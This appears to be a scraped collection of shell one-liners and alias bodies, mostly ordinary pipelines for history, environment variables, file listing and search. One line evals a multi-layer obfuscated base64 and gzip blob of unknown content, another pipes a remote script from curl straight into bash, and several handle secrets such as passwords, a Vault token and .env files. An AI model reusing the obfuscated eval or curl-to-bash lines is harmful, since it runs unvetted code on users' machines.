ffmpeg -i in.mov -pix_fmt rgb24 -r 20 -f gif - | gifsicle --optimize=3 --delay=3 > out.gif
ffmpeg -i 'concat:1.ts|2.ts' -c copy -bsf:a aac_adtstoasc 'out.mp4'
ffmd | xargs grep -H -n
ffjson | xargs grep -H -n
ffjson | xargs fgrep --color -H -n
ffjs | xargs grep -H -n
ffjs | xargs fgrep --color -H -n
ffjava | xargs grep -H -n
ffjava | xargs fgrep --color -H -n
ffind | xargs less
ffiles | xargs grep
ffform | xargs grep -H -n
ffform | xargs fgrep --color -H -n
fffile | xargs grep -H -n
fffile | xargs fgrep --color -H -n
ffel | xargs grep -H -n
ffel | xargs fgrep --color -H -n
ffe $1 | xargs etags -a -f TAGS
ffdir | xargs grep -H -n
ffdir | xargs fgrep --color -H -n
ffdesc | xargs grep -H -n
ffdesc | xargs fgrep --color -H -n
ffcss | xargs grep -H -n
ffcss | xargs fgrep --color -H -n
ffcpp | xargs grep -H -n
ffcpp | xargs fgrep --color -H -n
ffconf | xargs grep -H -n
ffconf | xargs fgrep --color -H -n
ffant | xargs grep -H -n
ffant | xargs fgrep --color -H -n
ff | g
ff () { gvim -S ~/.vim.sess --remote-silent `find . -name $@ | termenu -o 2> /dev/null` 2> /dev/null; }; ff $@
ff && tail -f -n50 /var/log/fm/abrelsford.log |& color
fetch | lolcat -p 0.7
feh \$(ls -tr *.png | tail -1)
feh /tmp/$(ls -1tr /tmp | tail -1)
feh /home/kmchang/repos/storage-test/screenshots/`ls /home/kmchang/repos/storage-test/screenshots/ | tail -n1`
feh -Z.|
feh --action1 'echo %F | xclip -sel clip' --action2 'gifview -a %F'
fd|grep
fdtdump /boot/overlays/wfx-spi.dtbo | grep max
fdisk -l|grep sd
fd0 . ~/dev | fzs
fd-root | fzs
fd-root | fzf
fd-home | fzs
fd-home | fzf
fd-all-root | fzs
fd-all-root | fzf
fd-all-home | fzs
fd-all-home | fzf
fd-all | fzs
fd-all | fzf
fd | xargs rg $@
fd | treel
fd | fzf
fd HEAD^1 HEAD | grep test
fd . | grep
fd -tf | xargs sed -i
fd -tf | ack -x
fd -e tex --max-depth 1 | entr -c -d latexrun -Wall /_
fd -e aux -e bbl -e bcf -e blg -e fdb_latexmk -e fls -e log -e out -e xml -e gz -e xdv | xargs -I{} rm -f {}
fd -Hd 1 -t l | xargs exa -la
fd -E vendor -E node_modules .|xargs grep -ri
fd --type f | fzf --preview 'bat --color \
fd --type f | fzf
fd --type f --type l -E '*.avi' -E '*.ttf' -E '*.doc?' -E '*.m??' -E '*.od?' -E '*.rar' -E '*.jp*' -E '*.pdf' -E '*.mp?' -E '*.pyc' -E '*.RData' -E '*.png' . ./ | fzf --reverse --height 100% --border --inline-info --preview 'head -100 {}'
fd --type f --hidden --follow --exclude .git | sk -m --preview 'bat --style=numbers --color=always {}'
fd --color=always | fzf --ansi --preview 'if isutf8 {}; then bat --color always {}; else file -b {}; fi'
fd $FZF_FD_OPTS | fzf $FZF_PREVIEW_OPTS --preview 'bat $FZF_BAT_OPTS {} 2>/dev/null'
fcitx | sogou-qimpanel &
fc-list | sort
fc-list | sed
fc-list | grep .local/share/fonts
fc-list | grep -i
fc-list | grep
fc-list | fzf
fc-list | awk '{\$1=\
fc-list :spacing=100 family style | sort -n
fc-list : family | sort
fc-list : family | sk
fc-list : family | grep -i
fc-list : family | fzf
fc-list : family style | grep -i
fc-list : family file | grep -i
fc-list '' family | sort -u
fc | xargs grep $@
fc -t '[%T]' -l 1 | awk '{swp=\$1;\$1=\$2;\$2=swp;print}'
fc -s | xclip -selection clipboard
fc -s | vim -
fc -s | more
fc -s | less -S
fc -s | less -R
fc -s | less
fc -s | grep --color=always
fc -s | cpdir
fc -s 2>&1 | pygmentize -l pytb
fc -rnl | head -1 >> ~/x.log
fc -rnl | head -1 >
fc -r -l |less
fc -nl -1 -1 | sed -e 's/^[[:space:]]*//'
fc -lr -1000 | grep -m 10
fc -ln|tail -n 1
fc -ln -99999 | fzf
fc -ln -2 | pbcopy
fc -ln -1000 | less
fc -ln -1000 | grep $2
fc -ln -100 | grep $2
fc -ln -1 | xsel --clipboard
fc -ln -1 | xclip -selection c
fc -ln -1 | tr -d '\n'
fc -ln -1 | sudo mksh -s
fc -ln -1 | sed 's/^\s*//'
fc -ln -1 | pbcopy
fc -ln -1 | cb
fc -ln -1 | cat >> ~/pers/sys/steps.md
fc -ln -1 | awk
fc -ln -1 2>/dev/null | perl -pe 's/^\s+//'
fc -li 1 |grep -i
fc -li 1 | less +G
fc -li 0 | ${PAGER:-less} ${LESS:--R} +G
fc -li -146 | awk
fc -li -100000 | grep $(date -I)
fc -l | more
fc -l | grep
fc -l 100 | grep
fc -l 1 | less
fc -l 1 | grep $1
fc -l 1 | grep
fc -l 1 | awk
fc -l 1 | ack -i
fc -l 1 2> /dev/null | tail -1024
fc -l 1 -1|awk
fc -l 0|grep
fc -l 0 | grep
fc -l 0 -1 | grep
fc -l -n 1 | grep $*
fc -l -n 0 | grep -E --color=auto
fc -l -n -1 | xclip -selection clipboard -i && echo Copied $(xclip -selection clipboard -o)
fc -l -n -1 -1 | pbcopy
fc -l -f -500 | fzf
fc -l -1000 | grep
fc -l -1 | cut -d
fc -ilD 1 | less +G
fc -il 1 | tail -n 40
fc -il 1 | less +G
fc -il 1 | head -40
fc -fl 0 | grep
fc -f -l -65535 | grep -i --color
fc -e -|xclip -selection clipboard
fc -e -|xclip
fc -e -|pbcopy
fc -e -|c
fc -e -| xclip -i -sel clip
fc -e -| pbcopy
fc -e - | pbcopy
fc -e - | copy
fc -e - |
fc -e - 2>/dev/null | xsel -i -b
fc -El 100 | grep
fc -El 0 | grep -iE
fc -El 0 | grep -E
fc -El 0 | grep
fc -El 0 | egrep
fc -El 0 | ag
fc -El 0 | ack
fc -EL 0 | grep
fbr | xargs git checkout
fbr | pbcopy
fb STREAM 1 20 | less
fb RECENT | less
fb INBOX -tid | less
fb FSTATUS | urlview
fb FSTATUS | less
fastboot devices | wc -l
fasd_cd -i $(fc -nl -1 | awk
fasd -l | fzf
fasd -dlR | percol
faker-cli --helpers userCard | jq
facts | clip
factit | pbcopy
f=`ls -td */ | head -1`; cd $f; ls -ltr
f2 | xargs -t kill
f(){ for i in $1; do cmd=$(echo $2 | sed
f(){ du -sh $1* | sort -hr; }; f
f(){ df ${1} | awk
f(){ cheat $@ | bat -n --theme=zenburn --color=always -l bash }; f
f() {python3 ~/.dotFiles/scripts/read.py $1 | w3m -T
f() {git whatchanged --since='1 day ago' --pretty=tformat: --numstat | awk \'{ add += $1 ; subs += $2 ; loc += $1 - $2 } END { printf \
f() {alias | grep $1};f
f() { whois $1 | grep -E '^\s{3}'}; f
f() { wget $1 -O - | tar -x};f
f() { wget $1 -O - | tar -xz};f
f() { wget $1 -O - | tar -xj};f
f() { rg --pretty $@ | less };f
f() { printf $1 | curl -F-=\<- qrenco.de };f
f() { os_type=$(ls --color=never ~/opt/virtualenvs/python2.7/per-os/ | termenu -o) && ~/opt/virtualenvs/python2.7/per-os/${os_type}/tlib/bin/python2.7 $@; }; f $@
f() { l | grep $@ };f
f() { jq -C $1 $2 | less -R };f
f() { if [ -z \$1 ]; then echo 'Please assign branch namespace.'; else git branch | awk -F. '/'
f() { git show $@ | cdiff -s -w 0 };f
f() { git diff --cached $@ | cdiff -s -w 0 };f
f() { git diff $@ | cdiff -s -w 0 };f
f() { find . -name $1 | xargs grep --mmap -l $2 }
f() { echo $@ ; (echo $@ | festival --tts) }; f
f() { curl -fsSL https://raw.githubusercontent.com/rockymadden/dotfiles-ubuntu/master/bin/upgrade | bash }; f
f() { curl $ELASTICSEARCH_URL/development_movida_schedulings/scheduling/\$1 | jq; }; f
f() { curl $1 2> /dev/null | jq };f
f() { (git branch -a ; git ls-files) | grep $1; GIT_PAGER=cat git grep $1; }; f
f \\.orig | xargs rm
f . | grep -i --color=auto
f '*.apk' | xargs ls -l
expr `ls -l | wc -l` - 1
expr `ls -a|wc -w` - 2
expr $(wc -l | tr -d
expr $(ll | wc -l) - 1
expr $(gdate +%s) - $(sysctl -n kern.boottime | cut -c9-18)
expr $(cal | awk 'FNR>2{d+=NF}END{print d}') - $(date +%d)
export | rg $1
export | grep ST_DIR
export | grep ST_
export | grep SGP
export | grep ROS
export | grep OS_
export | grep -i proxy
export | egrep
export | ack $1
export vaboxmach=default && VBoxManage showvminfo $(cat .vagrant/machines/${vaboxmach}/virtualbox/id) | grep NIC
export http_proxy=http://$proxy_auth ; export https_proxy=https://$proxy_auth; env | grep proxy ; mv -f /etc/systemd/system/docker.service.d/http-proxy.conf.NO /etc/systemd/system/docker.service.d/http-proxy.conf ; ls /etc/systemd/system/docker.service.d/http-proxy.conf*; git config --global https.proxy \
export http_proxy=`networksetup -getwebproxy Wi-Fi | awk
export `tmux show-env | grep DISPLAY`
export \$(grep -v '^#' .env | xargs -0)
export SSID=$(networksetup -getairportnetwork en0 | cut -c 24-)
export SSH_AUTH_SOCK=`ls -1rt /tmp/ssh-*/agent.* | tail -1`
export SSH_AUTH_SOCK=$(find /tmp/ssh-* -user $(whoami) -name agent\* 2>/dev/null |tail -1)
export SSH_AUTH_SOCK \$(tmux show-environment -g | grep ^SSH_AUTH_SOCK)
export ROS_MASTER_URI=http://$MBOT_IP_7:11311 && export ROS_IP=`get_interface_that_pings $MBOT_IP_7 | get_ip_of_interface`
export ROS_MASTER_URI=http://$MBOT_IP:11311 && export ROS_IP=`get_interface_that_pings $MBOT_IP | get_ip_of_interface`
export PYTHONPATH=`pwd|xargs dirname`
export PROMPT=`echo $PROMPT | sed -e s/%n/aaa/g`
export PATH=`echo $PATH | sed \
export PATH=$(echo $PATH| sed s/anaconda3/anaconda2/g)
export PATH=$(echo $PATH| sed s/anaconda2/anaconda3/g)
export ORACLE_SID=mxapps1;export ORACLE_HOME=/u001/MXDB/oracle;export PATH=/usr/kerberos/bin:/usr/local/bin:/bin:/usr/bin:/etc/opt/emcpower/bin:/home/oracle/bin:/u001/MXDB/oracle/bin; env |grep ORACLE
export ORACLE_SID=+ASM1;export ORACLE_HOME=/u001/MXDB/grid;export PATH=/usr/kerberos/bin:/usr/local/bin:/bin:/usr/bin:/etc/opt/emcpower/bin:/home/oracle/bin:/u001/MXDB/grid/bin;export TNS_ADMIN=/u001/MXDB/grid/network/admin; env |grep ORACLE
export NODE_ENV='lcdev' node --inspect ./ | bunyan
export MY_EP_VERSION=$(echo $PWD | sed -n
export MY_DOCKER_PORT=$(echo $PWD | sed -n
export LC_ALL=C;< /dev/urandom tr -dc 'A-Za-z0-9!@#$%^&*()_-+=' | head -c 11;echo;
export JAVA_HOME=$(/usr/libexec/java_home -v $(/usr/libexec/java_home -X | xmllint --xpath 'string(//array/dict/key[.=
export GOPROFILECOUNTER=\$((GOPROFILECOUNTER+1)); go test -bench=. -memprofile=prof.mem -cpuprofile=prof.cpu | tee prof.\$GOPROFILECOUNTER
export F=`ls -t /tmp/Flash*|head -1`;m $F
export DISPLAY=`echo $SSH_CLIENT | awk {'print $1'}`:0.0
export DISPLAY=`echo $REMOTEHOST | cut -f1 -d' '`:0
export CSENABLED=true; env | grep CSENABLED
export CPUS=`grep processor /proc/cpuinfo | wc -l`; make modules -j $[$CPUS*2] && sudo make modules_install && sync
export CPUS=`grep processor /proc/cpuinfo | wc -l`; make modules -j $[$CPUS*2]
export CPUS=`grep processor /proc/cpuinfo | wc -l`; make -j $[$CPUS*2] && sudo make modules_install && sudo make install && sync
export CPUS=`grep processor /proc/cpuinfo | wc -l`; make -j $[$CPUS*2]
export CLASSPATH=tools/`ls -1 tools | grep tablesaw`
export AWS_PROFILE && cat ~/.mantoso-pass | aws-google-auth -R us-east-1 -p mantoso-uat && export AWS_PROFILE=mantoso-uat
export AWS_PROFILE && cat ~/.mantoso-pass | aws-google-auth -R us-east-1 -p mantoso-qa && export AWS_PROFILE=mantoso-qa
export AWS_PROFILE && cat ~/.mantoso-pass | aws-google-auth -R us-east-1 -p mantoso-prod && export AWS_PROFILE=mantoso-prod
export AWS_PROFILE && cat ~/.mantoso-pass | aws-google-auth -R us-east-1 -p mantoso-master && export AWS_PROFILE=mantoso-master
export AWS_PROFILE && cat ~/.mantoso-pass | aws-google-auth -R us-east-1 -p mantoso-int && export AWS_PROFILE=mantoso-int
export AWS_PROFILE && cat ~/.mantoso-pass | aws-google-auth -R us-east-1 -p mantoso-infosec && export AWS_PROFILE=mantoso-infosec
export $(tmux showenv | grep DISPLAY)
export $(tmux show-environment | grep \^SSH_AUTH_SOCK=)
export $(tmux show-env | grep SSH_AUTH_SOCK)
export $(ssh -A -i ${DIR}/${PRIVATE_KEY} ec2-user@${BASTION_HOST} 'env | grep VAULT_TOKEN')
export $(grep -v '^#' .env | xargs)
export $(echo $PATH | awk
export $(cat .env-staging | xargs) && export VALLEY_DB_USER=valley
export $(cat .env-staging | xargs) && export MESA_DB_USER=mesa
export $(cat .env-staging | xargs) && export CRADLE_DB_USER=cradle
export $(cat .env-production | xargs) && export VALLEY_DB_USER=valley
export $(cat .env-production | xargs) && export MESA_DB_USER=mesa
export $(cat .env-production | xargs) && export CRADLE_DB_USER=cradle
export $(cat .env-development | xargs)
export $(cat .env | xargs)
expac -H M '%m\t%n' | sort -h
expac --timefmt='%y/%m/%d %R' '%l %w Package:%n\tDepends:%N\tGroup:%G' | sort
expac --timefmt='%Y-%m-%d %T' '%l\t%n'|sort -n
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort
expac --timefmt='%Y-%m-%d %T' '%l\t%n' `pacman -Qei | awk '/^Name/ { name=\$3 } /^Groups/ { if ( \$3 != \
expac --timefmt='%F %T' '%l %n' | sort -n
expac --humansize=M '%m %n' | sort -n
expac '%m\t%n' | sort -h
exit $(( $REW_FLAG | $SAVE_FLAG )) 2>/dev/null
exit $(( $FWD_FLAG | $SAVE_FLAG )) 2>/dev/null
exiqgrep -z -i | xargs exim -Mrm
exiqgrep -i -o 86400 | xargs exim -Mrm
exiftool \$(ls -tr *.png | tail -1)
exiftool $(find -type f | fzfexif)
exec-with-bash-if-available $(list-running-containers-by-pod | fzf)
exec startx &>| /tmp/startx-$USER
exa | grep
exa -lr --sort=size | head -n10
exa -lgh | less
exa -lgah --color always --sort oldest --git | less
exa -lgah --color always --git --group-directories-first | less
exa -lah --color=auto --group-directories-first | more
exa -laT --time-style=long-iso --git-ignore --ignore-glob='.git|.svn'
exa -la | less
exa -lF | grep --color=never '^d'
exa -l | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g'
exa -l | less
exa -l | grep
exa -l --color=automatic | grep --color=never '^d'
exa -l $icons | less
exa -as modified|tail -n1
exa -as created|tail -n1
exa -as accessed|tail -n1
exa -a | grep
exa -R | grep
exa -A | egrep '^\.'
exa -1 | wc -l
exa -1 --all | wc -l
exa --tree --level 4 --long --header --git --color=always | less -R
exa --tree --level 2 --long --header --git --color=always | less -R
exa --sort=oldest -l --color=always | head -n 20
exa --sort=modified --time=created --long --all -r | sed 15q
exa --sort=created --time=created --long --all -r | sed 15q
exa --header --long -a --color=always | grep -vE '\.DS_Store$' --color=always
exa --header --extended --long --group-directories-first --sort=modified --git | tail
exa --color=always --sort=modified -r -l | head
exa --all --tree -I .git --color=always | less -R
exa --all --long --tree -I .git --color=always | less -R
exa --all --long --header --color=always | less -R
evince ~/junk/doc/newer.pdf &>/dev/null &|
eval getent passwd {$(awk '/^UID_MIN/ {print $2}' /etc/login.defs)..$(awk '/^UID_MAX/ {print $2}' /etc/login.defs)} | cut -d: -f1
eval export \`tmux show-environment | grep DISPLAY\`
eval \`resize | grep -v \
eval \$(tmux show-env -s | grep '^SSH_')
eval \$(egrep -v '^#' .env | xargs)
eval \$(cat ~/.aliases.zsh | grep \
eval $(~/.local/bin/thefuck $(fc -ln -1 | tail -n 1)); fc -R
eval $(tmux show-env -s |grep '^SSH_')
eval $(tmux show-env -s |grep
eval $(thefuck $(fc -ln | tail -n 1)); fc -R
eval $(thefuck $(fc -ln 0 | tail -n 1)); fc -R
eval $(thefuck $(fc -ln -1 | tail -n 1)); fc -R
eval $(thefuck $(fc -ln -1 | tail -n 1));
eval $(thefuck $(fc -ln -1 | tail -n 1))
eval $(lpass show -p stage.docker.com | bt login --username manish --password-stdin --environment stage)
eval $(lpass show -p 9125129690469393413 | bt login --username manisht --password-stdin --environment prod)
eval $(jobs | ~/.local/bin/fg_vim.py)
eval $(echo 'ZWNobyAnSDRzSUFIazBSMVFBQThWWnk1TGpJQXk4NzFmTXpSZVhpek44QWpWd2hEdmNvSW9ybjc4dEFZNlQySTZUYk5XeU8vdElacUsyMUpKYTR1Zm5mNTgvL3h2QU54QVdQdjhEd2pJclZXMUt3amlESThMWEtONkJnSWNPMWppYzM5dHhQa29WQUtwaytSbWF5eEJnM1J1Mjdjd1dBci9TWC9aWnp1L0R1QUpoV2VhYzlKUGhSeHp3RDRManRhM3FuMEpZcGxDRjlzYTRVd1Q5M1FZRHdVbmxPa2RlUUZnaWlPZnhvWHpNamlmY2VNc1k3N1crUVRYbElvZ1RDSXNLSVZ1ZGFoWDBaSVo5c2JGS2hqMjlacndRUW10aGNiejNLMHdUTDRFNGhpQ1RzRFY1a1dLSlNXajhncDMybk1hUVFWajFlTkhhaE44VnpxSmsrYjBMbUo2K2dTQVJBVHczekhsaE5mMlpZb3c1TXg2MkJ1YkI5WGh5dkN2b1QvY1lvTi9mOGpHRUpaUnE2U09IdDcyb3BjUkltWS84d0x0QzR6VnZ0S2d4QVltQUsvd2RaZHUveFlWUUhFQW9WcThjRkhqNGlReUhUZEl2eTBTSktvcWFaVXpBVndCYUNQOVFPWng5SFlxRFFDeVdFWER0bTFvbldPYW5zak5KZWhObzVua0NkMFBPMFRKWHZEYlg2WEFBUWJhUGNDSk1GMW9STnl6MERoa3krVUwzN09SWXVQZ2hoTUEvN2F1YXIwRDRhYTVRVWtyR2dGelJ6Q0E4aU5PdmF1VXVCR1lDdUpUVk5GMXB5SXlnUVlBZmlKNHc3dGdYU0paWGtkaURvQnFiVEZUelJVM1ErRUFRWkNocEZDZnVHZVlsSVhjZ2dJb2NCaDNsZkFWQjB5NVR4eEJ5OWZmMTRaVWJuaUZRTXJBVFJBM3FQQTR3ckFKcUZaSVN5VkJyVFltS3RIam9KSHArRjBMaWJIRGFwaGltZlhsR0NTQ1ovTStOeTFFY3pGMUhPL2ZEUGhmWUNRTkM5L1RtMExNbmZkYTl3Y1ZOT1B5cEcvWWdUSjY5a0dKV2crVUZuczQ1Qklrc25lWndMbUFjVlVsejY1aS8valF2OXlDRUhvZ2FxVTIzRW5Qcnp0cS8xRSthQzhLdGFZY3pCTHNRU3Z1Z0Y0WXVIM2VPWUJkQzVCLzAxdXgvSkFUS0NUcnorS1lUNXdteEQ0RWM0SzNmTmFSSkZFN0Y3NzNIQUxYenBHUEVlQUJqc3pxdExZY1pjWFM2SXB6MXc4UGZma2FEdUJBWDR4c2NJSjNLeVAwZWNZekFER1U4MVgyZ1RtVE9JRkl5NExLdk9YcDc2b1pkQ0VzOUNyYXo2OGkweUxRWERWTURPNEdQUnp5am9sYnpMb1RPeUoyank5QXRWS0tVM2FtTnNjV2h4bGh5SkdHZFgzVGJBd2p6cnBlZHFQa0dnZHB6VGhBSHFLTTFrblNEWVhRTDhrSnNFQlRrWFVISG56NkI4T3hqSnlMMFNPNmYxa3YxbkdGU3ppUXJlcXRrL2RhOHdKSVQ5aWRsejByRGdYeTlJNE1qL1V6dEFzcXNoTG0xWmpXVDRTbGtydHhTS2pvTndNcUYzTHVjeXU5N2daM1FDck9nWHRWZW5XU28wT3YwZkxFbURrQU0xTFF5dFpEUVR0NUNhSEJmS0k2RFFOVGZoa0Z2OGF2ZUhkMFk2NUFnTXdzbVNVWjdMMXNoMUlvK1IrbHdqdUJRdm5wdVRhWnU4NmxzK2hNdk5qQlpUSHdvUXZUWXpNblZDN1dHNVlMNlBab2pncUFITldrajRoZTc1cjVkeFF6empXbElhYkE2Z3BPanhpc2o1ZkZNR2FqZkd0S1B3OWhVTE9zQVVZam9OLzJDVEFBTlYwMUI5amsvb2VjdTdUcU9KK3NaM0hQR2xxRFkxNnlSWVV0S25pM2dleVNCcFArVHFHRUVwVkd5TXlFQlF2NE9BazJXbUZ0cmxpM2c1RzJvS0VVenJVZ2tWR2xzZ29iQnVHQlp3SEpXREM2U2tFMlhGZ3puVzVZSUNJWG54c0U0M25ueDFFZzVTWG81OFZDYlJ5QUlBRXRwUVVYemV3aUxwa2hNcEdCUmhLcnVhd1V5aTVJOHRHU3JpNEhTc3BVTTloQkJURmZJOEdMWGxJMVBwYlhhUmRMQVVLa3dOZU5VSDFzQm5taWt6YTBXc0gwS2tSZTJWdms5aEo4UXJRVUdBb0hSZ1loSGpKakpKaDNWNnJMc3JTa2xIbWxwQTBWcm1YcUpqNi8zanNHTDJOWUlnTUFlYjdScnNkL21BQ2pJKzBGVzNVYlRZdWpLMXUwbGhDVWFLTmxJamcrdEZlUmVDRmNBdWRkQ0lHZ3JMMjV0bHFqeFR5Q2dVR3FxVVRSVjhHcU42RUFsZ0lPaTVyYlp5RlNLN0dicjZERUlVYW00VUI4dkxZQURxU1BuTmRFY3VZWWtKSTB3RXcxbXJsZE1oQTBDV3IrMlhpRmZqK1lYMStCWnRQMmIwYXlRTW1HZ0xPREF0SmxhK0ZWcElRaWpVdWVTMEZHZ01yNkdRTHRZM2VVTDBwMFRrNzFmMXpTOGJkbFF6anBIS0h1TGFEMzMwQmx2M0VjczJUZWR3RVdaa0NENjlFKy8zVGhTREFaTitlK01WdU9SS2VKSU9yMTFLNk8yd3hxdGNaNjFQZ0hvWjhpb1NGdFNXcy9xL2Z4NDgySm9rdmJKNmhhQUhhcUZVNFpMR2JqTWUzSjBGSjMyRXVUdHV5bDFPRTFTS1dpcXBRd0F2UDVpamFFYmlCU2ZlZm4rRFowOHdHQnM3ZHFOZHlHeWwvRElTcmgxVm02clQ1M3JmUWlMMkhVQjErTldOTVBxQWlBd3cwVzBzN2ZvWE9zbzhqbUVYVGNZVzBjVFpScU9GcFp2MzJ0YUVpVmJ1ZUhpdXdQdGtkVDB5VldwRkkvam5tOTFPdzd0RmhvQ0tlODlSbHM4OEVFSVQ3bU14c01qK0dlM3Rmbis5a09uRG1CdFhUME01UkVyQ3g1V2ZMRkpyRkxyWnhDMmZFQWkxRUhFRlVKZ1lWdjJhT1BhUlE5S1BEb3ZpbWYrRUVLNnJkT2dUT0l6QkRybGJqWFo3d1lHT2ZreXJjSVI0UU1JY3lwaExCWmMwNUUxeGpVaGM1OTBpNzJ2bm4xdE9GRDh1bjZ0cUQvSmlOc0gwN1ZZR2dTL09ZSnFVOXpKbXhVRnR6dTY4Y09YK2FvdU9OMVVmRXFyc0czMUdWOXBiMWZFbzNEVGRjSzJxeFB0L3Z6NUM3ZC9kMXJISVFBQScgfCBiYXNlNjQgLUQgfCBndW56aXAK' | base64 -D) && ls
eval $(dircolors -p | perl -pe
eval $(cat ~/.zshenv |grep -i '_proxy')
eval $($(fc -ln -1) 2>&1 | sed -n 2p)
escapepath | xargs -I {} mv {}
errno -l|less
env|sort -f
env|sort
env|grep ROS
env|grep ORA
env|grep OIFS_
env|grep DOCKER
env|grep -i kube
env|grep -i AWS
env|grep -i
env|grep -Ei
env|grep
env |sort
env |less
env |grep SSH_AGENT_PID && ssh-add -l
env |grep PATH
env |grep -i
env |grep
env |egrep -i
env |awk -F '=' '{print \$1 \
env | sort F
env | sort -n
env | sort -h
env | sort -f
env | sort --ignore-case
env | sort
env | peco --layout bottom-up
env | peco
env | less
env | igrep
env | grep screen
env | grep proxy
env | grep ^PATH=
env | grep \!*
env | grep YARN_
env | grep URL
env | grep TSP
env | grep TSI_APP_ID
env | grep TF_VAR
env | grep TARGET
env | grep ROS
env | grep RAILS_ENV
env | grep QNX
env | grep PATH
env | grep ORACLE
env | grep NODE_
env | grep MONGO_
env | grep KUBECONFIG
env | grep JAVA_HOME
env | grep INSTANCEID
env | grep DOCKER_
env | grep DOCKER
env | grep DISPLAY
env | grep DATABASE
env | grep BOUNDARY
env | grep AWS
env | grep -v LESS_TERMCAP
env | grep -v AH_HOST_ACCESS_KEY
env | grep -iE --color=auto
env | grep -i proxy && cat ~/.curlrc
env | grep -i proxy
env | grep -i ^DOCKER
env | grep -i \!*
env | grep -i SSH_Connection
env | grep -i NIX_SHELL
env | grep -i $1
env | grep -i $*
env | grep -i
env | grep -e APP_ -e MYSQL_ -e AWS_ -e CELERY_
env | grep -E -i
env | grep --text USER
env | grep --text PATH
env | grep --text HOME
env | grep --color=no AWS
env | grep --color
env | grep '^[a-z]\+='
env | grep 'REGEX[^=]*' -o
env | grep $@
env | grep $1
env | grep
env | fzf
env | egrep -i
env | egrep --color=auto -i
env | egrep
env | cat -v
env | awk -F \
env | ack '^(.*?)='
env | ack '(.*?)\=(.*)'
env | ack '(.*?)=.*'
env cat /usr/include/asm/unistd_64.h | grep
env cat /usr/include/asm/unistd_32.h | grep
env \$(cat .env | xargs)
env \$(cat .env | grep \
env PATH='${PATH/$HOME\/\.anyenv\/envs\/pyenv\/shims(:|)/}' brew
env LC_CTYPE=C tr -dc 'a-zA-Z0-9-!@#$%&*_+.=' < /dev/urandom | head -c 20 ; echo
env $* | sort
env $(cat .env | xargs) nodemon
env $(cat .env | xargs) bundle exec jekyll serve
env $(cat .env | xargs) bundle exec
env $(cat .env | xargs) bin/rails
env $(cat .env | xargs)
env $([ -f .env ] && cat .env | xargs) mix
env $([ -f .env ] && cat .env | xargs) iex
env $([ -f .env ] && cat .env | xargs)
encfs /media/$USER/USBPRO/Coffre-fort ~/safe-on-usb && df -h | grep safe-on
emulator -avd \$(emulator -list-avds | head -n 1)
emulator -avd $1 -dns-server $(cat /etc/resolv.conf | awk '/^nameserver/ {print $2}')
empty | filter
emol |grep
emerge -DNup @world|genlop -p
emerge --pretend --update --deep --newuse @world | sudo genlop -pq
emacs `gdn | grep -v __init__`
emacs -nw `ls -t | head -1`
emacs --daemon &|
elinks -dump randomfunfacts.com | sed -n
electron index.js | grep -v ERROR:CONSOLE
electron . | grep -v ProductRegistryImpl.Registry
elderberry diff | less
eix-installed all | grep
egrep ^menuentry /etc/grub2.cfg | cut -f 2 -d \'
egrep ^bind ~/.i3/config | cut -d
egrep ^bind ~/.config/i3/config | cut d
egrep ^bind ~/.config/i3/config | cut -d
egrep ^bind .config/i3/config | cut -d
egrep ^bind ${I3_CONFIG}/config | cut -d
egrep BASTION ~/.ssh/config | awk
egrep -v '^\#' | egrep -v '^$'
egrep -v '^[[:space:]]*(#|$)'
egrep -v '^(\s*)?(#|$)'
egrep -v '^([\ \t]*#|$)'
egrep -v '^(#|$)'
egrep -v '^$|^#'
egrep -v '(^.*#.*|^$)'
egrep -v '(^#|^$)'
egrep -o '^.*:::' | egrep -o '^.*[^:::]'
egrep -i (error|fail)
egrep -e '^(>[^>])' $HOME/MISC/LDlist.sfh | sed -e 's/>>/ /g'
egrep -d skip -v '^( *#|$)'
egrep -c '(vmx|svm)' /proc/cpuinfo
egrep --color -E '.*${USER}.*|$'
egrep 'docker|dkr' ~/.dockerrc
egrep 'alias|function .*\(' /classroom/bash/bashrc
egrep '^...... .... .... ... (A|B) ... '
egrep '\[error|\[warning'
efivar --list | xargs -I vn efivar --print --name=vn
effect=格式化显示包含指定字符git_log;ftGitLogShell -n 100 |grep
effect=xbash扩展说明查找;ftMain -h |grep -i
effect=bash命令历史查询;cat $(ftBashHistory -p) |grep
edit `git diff --name-only | uniq`
edit `find ./db/migrate | tail -1`
echo|xclip
echo|openssl s_client -port 443 -CAfile /etc/ssl/certs/ca-certificates.crt -host
echotc us && echo '\e[1;32mBoot Time:\e[0m ' | pv -qL 10 && systemd-analyze
echo_first `git log --branches --no-merges --oneline | peco`
echo;pwd;echo;echo find file;echo;find . | grep -i;echo
echo;pwd;echo;echo find file;echo;find . | grep -i
echo;echo find perl files...;echo;find . | grep \
echo;echo List svn modified files;echo;svn st -q | grep \
echo;echo '--> set permissions...'; grant '/usr/local/bin'; grant '/usr/local/bin/npm'; grant '/usr/local/bin/node'; grant '/usr/local/bin/brew'; grant '/Users/${USER}/.nvm/versions/node/v7.8.0/bin/node'; grant '/Users/${USER}/.nvm/versions/node/v7.8.0/bin/npm'; grant '/usr/local/bin/nvm'; grant '/usr/local/bin/rbenv'; grant '/usr/local/bin/bash'; grant '/usr/local/go/bin'; grant '/usr/local/go'; grant '/usr/local/lib/node_modules/npm'; echo;echo 'permissions set|<--'
echo;echo '--> brew bundle dump --force -v --global'; brew bundle dump --force -v --global; cat $HOME/.Brewfile | tee $HOME/brew-bundle-update
echo;echo '--> brew bundle check --global -v'; brew bundle check --global -v | tee $HOME/brew-bundle-check
echo;echo '--> brew bundle --global -v'; brew bundle --global -v | tee $HOME/brew-bundle-refresh
echo;echo '--> all lists...'; brew-list; npm-list; gem-list; pip-list; echo;echo 'all lists done |<--'
echo; top -l 1 | head -10; echo
echo; ip -o -6 addr | cut -d\\ -f1; echo; ip -6 route; echo
echo; echo; git log --oneline --all --graph --decorate $(git reflog | awk
echo ❨╯°□°❩╯︵┻━┻ | pbcopy
echo |lolcat -a -d 2
echo 🐺| xargs -I %
echo ‘Removing Docker Image(s)’ ; docker images -q | xargs docker rmi
echo ♧ ♣ |lolcat -a -d 500
echo ★ |lo︎cat -a -d 500
echo ✝ |lolcat -a -d 500
echo ♂ |lolcat -a -d 500
echo ♀ |lolcat -a -d 500
echo ☭ |lolcat -a -d 500
echo ☤ |lolcat -a -d 500
echo ™ |lolcat -a -d 500
echo … | xsel --clipboard
